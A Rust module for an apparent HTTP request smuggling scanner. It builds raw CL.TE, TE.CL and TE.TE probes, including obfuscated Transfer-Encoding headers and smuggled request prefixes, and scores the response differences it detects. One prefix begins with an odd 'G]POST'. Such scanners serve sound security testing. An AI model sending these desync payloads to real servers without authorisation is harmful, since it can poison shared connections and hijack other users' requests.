use std::fmt;
use std::time::Duration;

/// HTTP request smuggling technique classification.
///
/// Each variant represents a distinct desync strategy based on how the
/// frontend (reverse proxy) and backend (origin server) disagree about
/// request boundaries. The naming convention follows PortSwigger's taxonomy:
/// "FrontendInterpretation.BackendInterpretation".
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SmugglingTechnique {
    /// Frontend uses Content-Length, backend uses Transfer-Encoding.
    ClTe,
    /// Frontend uses Transfer-Encoding, backend uses Content-Length.
    TeCl,
    /// Both use Transfer-Encoding but disagree on obfuscation.
    TeTe,
    /// HTTP/2 frontend, HTTP/1.1 backend with Content-Length disagreement.
    H2Cl,
    /// HTTP/2 frontend, HTTP/1.1 backend with Transfer-Encoding injection.
    H2Te,
    /// H2C upgrade smuggling via cleartext HTTP/2 connection reuse.
    H2cSmuggle,
}

impl fmt::Display for SmugglingTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ClTe => write!(f, "CL.TE"),
            Self::TeCl => write!(f, "TE.CL"),
            Self::TeTe => write!(f, "TE.TE"),
            Self::H2Cl => write!(f, "H2.CL"),
            Self::H2Te => write!(f, "H2.TE"),
            Self::H2cSmuggle => write!(f, "H2C Smuggle"),
        }
    }
}

/// A single smuggling probe: the raw bytes to send and expected behavior.
///
/// The probe consists of a "treatment" request (the smuggling attempt) and
/// a "control" request (identical except for the smuggling payload). If the
/// treatment causes a different response for a subsequent "victim" request,
/// the desync is confirmed.
#[derive(Debug, Clone)]
pub struct SmugglingProbe {
    pub technique: SmugglingTechnique,
    pub name: String,
    pub description: String,
    pub treatment_headers: Vec<(String, String)>,
    pub treatment_body: Vec<u8>,
    pub control_headers: Vec<(String, String)>,
    pub control_body: Vec<u8>,
    pub timeout: Duration,
    pub obfuscation: Option<TeObfuscation>,
}

/// Transfer-Encoding obfuscation variants used in TE.TE attacks.
///
/// Different reverse proxies (HAProxy, Nginx, Apache, Cloudflare, AWS ALB)
/// normalize Transfer-Encoding differently. Each obfuscation targets a
/// known parser differential.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TeObfuscation {
    /// `Transfer-Encoding: xchunked`
    PrefixJunk,
    /// `Transfer-Encoding : chunked` (space before colon)
    SpaceBeforeColon,
    /// `Transfer-Encoding:\tchunked` (tab instead of space)
    TabSeparator,
    /// `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
    DuplicateHeader,
    /// `Transfer-Encoding:\x0bchunked` (vertical tab)
    VerticalTab,
    /// `Transfer-Encoding: chunked` with trailing `\r\n\t` (line folding)
    LineFolding,
    /// Mixed case: `TrAnSfEr-EnCoDiNg: chunked`
    MixedCase,
    /// `Transfer-Encoding: ,chunked` (leading comma)
    LeadingComma,
    /// Newline in value: `Transfer-Encoding: chunked\n`
    NewlineInValue,
    /// `Transfer-Encoding: identity, chunked`
    IdentityPrefix,
}

impl fmt::Display for TeObfuscation {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::PrefixJunk => write!(f, "prefix_junk"),
            Self::SpaceBeforeColon => write!(f, "space_before_colon"),
            Self::TabSeparator => write!(f, "tab_separator"),
            Self::DuplicateHeader => write!(f, "duplicate_header"),
            Self::VerticalTab => write!(f, "vertical_tab"),
            Self::LineFolding => write!(f, "line_folding"),
            Self::MixedCase => write!(f, "mixed_case"),
            Self::LeadingComma => write!(f, "leading_comma"),
            Self::NewlineInValue => write!(f, "newline_in_value"),
            Self::IdentityPrefix => write!(f, "identity_prefix"),
        }
    }
}

/// Result of a counterfactual smuggling test.
///
/// A finding is "confirmed" only if the treatment produces a detectably
/// different response than the control on a subsequent (victim) request.
/// This eliminates false positives from broken endpoints or network jitter.
#[derive(Debug, Clone)]
pub struct SmugglingResult {
    pub technique: SmugglingTechnique,
    pub probe_name: String,
    pub confirmed: bool,
    pub evidence: SmugglingEvidence,
    pub severity: f64,
    pub obfuscation: Option<TeObfuscation>,
}

/// Evidence supporting or refuting a smuggling finding.
#[derive(Debug, Clone)]
pub enum SmugglingEvidence {
    /// Treatment response differed from control in a meaningful way.
    ResponseDifferential {
        treatment_status: u16,
        control_status: u16,
        treatment_body_len: usize,
        control_body_len: usize,
    },
    /// Treatment caused a timing differential suggesting socket poisoning.
    TimingDifferential { treatment_ms: u64, control_ms: u64 },
    /// Treatment caused the next request to receive the smuggled prefix.
    PrefixReflected { reflected_bytes: Vec<u8> },
    /// No differential detected — finding not confirmed.
    NoDesync,
}

/// Generate all CL.TE probes for a given endpoint.
///
/// CL.TE: The frontend uses Content-Length to determine the request boundary.
/// The backend uses Transfer-Encoding: chunked. We send a request where CL
/// says "this is the full body" but the chunked encoding terminates early,
/// leaving a smuggled prefix in the backend's input buffer.
pub fn generate_cl_te_probes(path: &str, host: &str) -> Vec<SmugglingProbe> {
    let base_timeout = Duration::from_secs(10);

    let smuggled_prefix = format!(
        "G]POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 10\r\n\r\nx=",
        path, host
    );

    let chunked_body_treatment = format!("0\r\n\r\n{}", smuggled_prefix);
    let cl_value = chunked_body_treatment.len().to_string();

    vec![
        SmugglingProbe {
            technique: SmugglingTechnique::ClTe,
            name: "CL.TE basic".to_string(),
            description: "Frontend reads Content-Length bytes, backend processes Transfer-Encoding: chunked. Smuggled prefix poisons next request.".to_string(),
            treatment_headers: vec![
                ("Host".to_string(), host.to_string()),
                ("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string()),
                ("Content-Length".to_string(), cl_value.clone()),
                ("Transfer-Encoding".to_string(), "chunked".to_string()),
            ],
            treatment_body: chunked_body_treatment.into_bytes(),
            control_headers: vec![
                ("Host".to_string(), host.to_string()),
                ("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string()),
                ("Content-Length".to_string(), "0".to_string()),
            ],
            control_body: Vec::new(),
            timeout: base_timeout,
            obfuscation: None,
        },
        SmugglingProbe {
            technique: SmugglingTechnique::ClTe,
            name: "CL.TE timing".to_string(),
            description: "Send CL.TE with incomplete chunk to cause backend timeout differential.".to_string(),
            treatment_headers: vec![
                ("Host".to_string(), host.to_string()),
                ("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string()),
                ("Content-Length".to_string(), "4".to_string()),
                ("Transfer-Encoding".to_string(), "chunked".to_string()),
            ],
            treatment_body: b"1\r\nZ".to_vec(),
            control_headers: vec![
                ("Host".to_string(), host.to_string()),
                ("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string()),
                ("Content-Length".to_string(), "0".to_string()),
            ],
            control_body: Vec::new(),
            timeout: Duration::from_secs(5),
            obfuscation: None,
        },
    ]
}

/// Generate all TE.CL probes for a given endpoint.
///
/// TE.CL: The frontend uses Transfer-Encoding: chunked. The backend uses
/// Content-Length. We send valid chunked data where the chunk says "read N
/// bytes" but the embedded Content-Length in the smuggled request is shorter,
/// causing the backend to treat the remainder as the start of the next request.
pub fn generate_te_cl_probes(path: &str, host: &str) -> Vec<SmugglingProbe> {
    let smuggled_body = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Length: 10\r\n\r\nx=smuggled",
        path, host
    );
    let chunk_hex = format!("{:x}", smuggled_body.len());
    let chunked_body = format!("{}\r\n{}\r\n0\r\n\r\n", chunk_hex, smuggled_body);

    vec![SmugglingProbe {
        technique: SmugglingTechnique::TeCl,
        name: "TE.CL basic".to_string(),
        description: "Frontend processes chunks, backend uses Content-Length: 0 and treats chunk body as next request.".to_string(),
        treatment_headers: vec![
            ("Host".to_string(), host.to_string()),
            ("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string()),
            ("Content-Length".to_string(), "0".to_string()),
            ("Transfer-Encoding".to_string(), "chunked".to_string()),
        ],
        treatment_body: chunked_body.into_bytes(),
        control_headers: vec![
            ("Host".to_string(), host.to_string()),
            ("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string()),
            ("Content-Length".to_string(), "0".to_string()),
        ],
        control_body: Vec::new(),
        timeout: Duration::from_secs(10),
        obfuscation: None,
    }]
}

/// Generate TE.TE probes with all known obfuscation variants.
///
/// TE.TE: Both frontend and backend support Transfer-Encoding, but one
/// of them fails to parse an obfuscated variant. The one that rejects
/// the obfuscated TE falls back to Content-Length, creating a desync.
pub fn generate_te_te_probes(_path: &str, host: &str) -> Vec<SmugglingProbe> {
    let obfuscations = vec![
        (TeObfuscation::PrefixJunk, "xchunked"),
        (TeObfuscation::SpaceBeforeColon, "chunked"),
        (TeObfuscation::TabSeparator, "chunked"),
        (TeObfuscation::MixedCase, "chunked"),
        (TeObfuscation::LeadingComma, ",chunked"),
        (TeObfuscation::IdentityPrefix, "identity, chunked"),
    ];

    obfuscations
        .into_iter()
        .map(|(obfusc, te_value)| {
            let te_header_name = match &obfusc {
                TeObfuscation::SpaceBeforeColon => "Transfer-Encoding ".to_string(),
                TeObfuscation::MixedCase => "TrAnSfEr-EnCoDiNg".to_string(),
                TeObfuscation::PrefixJunk => "Transfer-Encoding".to_string(),
                _ => "Transfer-Encoding".to_string(),
            };

            SmugglingProbe {
                technique: SmugglingTechnique::TeTe,
                name: format!("TE.TE {}", obfusc),
                description: format!(
                    "Obfuscated Transfer-Encoding ({}) causes parser differential between frontend and backend.",
                    obfusc
                ),
                treatment_headers: vec![
                    ("Host".to_string(), host.to_string()),
                    ("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string()),
                    ("Content-Length".to_string(), "4".to_string()),
                    (te_header_name, te_value.to_string()),
                ],
                treatment_body: b"0\r\n\r\n".to_vec(),
                control_headers: vec![
                    ("Host".to_string(), host.to_string()),
                    ("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string()),
                    ("Content-Length".to_string(), "0".to_string()),
                ],
                control_body: Vec::new(),
                timeout: Duration::from_secs(5),
                obfuscation: Some(obfusc),
            }
        })
        .collect()
}

/// Generate all probes for a target, across all techniques.
pub fn generate_all_probes(path: &str, host: &str) -> Vec<SmugglingProbe> {
    let mut probes = Vec::new();
    probes.extend(generate_cl_te_probes(path, host));
    probes.extend(generate_te_cl_probes(path, host));
    probes.extend(generate_te_te_probes(path, host));
    probes
}

/// Evaluate whether a response differential constitutes confirmed smuggling.
///
/// Criteria for confirmation:
/// - Status code differential (e.g., 200 vs 400/408/500)
/// - Significant body length differential (>50% difference)
/// - Timing differential >2x for timeout-based detection
pub fn evaluate_differential(
    treatment_status: u16,
    treatment_body_len: usize,
    treatment_ms: u64,
    control_status: u16,
    control_body_len: usize,
    control_ms: u64,
) -> SmugglingEvidence {
    if treatment_status != control_status {
        return SmugglingEvidence::ResponseDifferential {
            treatment_status,
            control_status,
            treatment_body_len,
            control_body_len,
        };
    }

    let len_ratio = if control_body_len > 0 {
        (treatment_body_len as f64 - control_body_len as f64).abs() / control_body_len as f64
    } else if treatment_body_len > 0 {
        1.0
    } else {
        0.0
    };

    if len_ratio > 0.5 && (treatment_body_len as i64 - control_body_len as i64).unsigned_abs() > 50
    {
        return SmugglingEvidence::ResponseDifferential {
            treatment_status,
            control_status,
            treatment_body_len,
            control_body_len,
        };
    }

    if control_ms > 0 && treatment_ms > control_ms * 2 && treatment_ms - control_ms > 2000 {
        return SmugglingEvidence::TimingDifferential {
            treatment_ms,
            control_ms,
        };
    }

    SmugglingEvidence::NoDesync
}

/// Compute severity for a confirmed smuggling finding.
///
/// CL.TE and TE.CL are critical (9.0+) because they enable full request
/// hijacking. TE.TE is high (8.0) because it requires specific proxy
/// combinations. H2.* are critical (9.5) because they're harder to detect
/// and affect modern infrastructure.
pub fn technique_severity(technique: SmugglingTechnique) -> f64 {
    match technique {
        SmugglingTechnique::ClTe => 9.1,
        SmugglingTechnique::TeCl => 9.1,
        SmugglingTechnique::TeTe => 8.0,
        SmugglingTechnique::H2Cl => 9.5,
        SmugglingTechnique::H2Te => 9.5,
        SmugglingTechnique::H2cSmuggle => 7.5,
    }
}

/// Build a `SmugglingResult` from probe + evidence.
pub fn build_result(probe: &SmugglingProbe, evidence: SmugglingEvidence) -> SmugglingResult {
    let confirmed = !matches!(evidence, SmugglingEvidence::NoDesync);
    SmugglingResult {
        technique: probe.technique,
        probe_name: probe.name.clone(),
        confirmed,
        evidence,
        severity: if confirmed {
            technique_severity(probe.technique)
        } else {
            0.0
        },
        obfuscation: probe.obfuscation.clone(),
    }
}

#[cfg(test)]
#[path = "smuggling_engine_test.rs"]
mod smuggling_engine_test;
